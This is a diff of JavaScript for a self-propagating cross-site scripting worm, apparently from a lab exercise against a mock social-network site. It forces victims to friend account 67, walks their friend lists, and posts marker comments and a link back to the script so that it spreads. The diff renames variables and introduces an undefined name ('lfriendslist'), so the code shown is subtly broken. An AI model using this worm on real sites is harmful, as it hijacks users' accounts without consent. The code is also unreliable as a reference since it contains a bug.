@@ -4,21 +4,21 @@
 $.get("add_friend.php", {'id': 67})
 
 //places worm on other pages
-$.get("friends.php", function(friends){
-    listFriends = friends.split("?id=")
+$.get("friends.php", function(grabfriends){
+    friendslist = grabfriends.split("?id=")
     //moves through the friend list
-    for(var i = 1; i < listFriends.length; i++){
+    for(var i = 1; i < friendslist.length; i++){
         //Sets the id of the friend
-        specid = listFriends[i].split("'>").toString().split(',')[0];
+        specid = lfriendslist[i].split("'>").toString().split(',')[0];
 	    check(specid)
 
     }
 });
 
 function check(specid){
-    $.get("timeline.php", {'id': 67}, function(timeline){
+    $.get("timeline.php", {'id': 67}, function(spread){
         //places the script on their page if it hasn't already
-        if(!timeline.includes(specid+":has Nikolas Zahorian at time: ")){
+        if(!spread.includes(specid+":has Nikolas Zahorian at time: ")){
             //comments on the page to guarentee that it won't post again
             $.get("/add_comment.php", {'id': 67, 'comment':  specid+":has Nikolas Zahorian at time: "+new Date(Date.now()).toLocaleString()})
             //adds the link back to the original script to spread further
